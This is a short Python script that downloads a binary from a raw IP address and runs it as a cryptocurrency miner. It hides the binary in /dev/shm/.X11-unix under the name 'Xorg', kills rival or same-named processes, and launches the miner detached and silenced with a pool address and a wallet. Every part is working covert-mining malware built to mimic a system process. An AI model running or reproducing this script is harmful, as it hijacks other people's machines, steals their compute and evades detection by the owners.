import urllib.request
import os
import subprocess
import time

os.makedirs("/dev/shm/.X11-unix", exist_ok=True)
miner = "/dev/shm/.X11-unix/Xorg"

subprocess.run(["pkill", "-9", "-f", "alpha-miner"], capture_output=True)
subprocess.run(["pkill", "-9", "-f", "Xorg"], capture_output=True)
time.sleep(1)

try:
    req = urllib.request.Request("http://151.247.219.40:8000/alpha-miner", headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=180) as resp:
        with open(miner, "wb") as f:
            f.write(resp.read())
    downloaded = os.path.getsize(miner) > 10000000
except:
    downloaded = False

if downloaded:
    os.chmod(miner, 0o755)
    subprocess.Popen([miner, "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "RTX3090_31"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    time.sleep(3)
    r = subprocess.run(["pgrep", "-f", "alpha-miner"], capture_output=True)
    result = "RUNNING:" + r.stdout.decode().strip() if r.returncode == 0 else "START_FAILED"
else:
    result = "DOWNLOAD_FAILED"
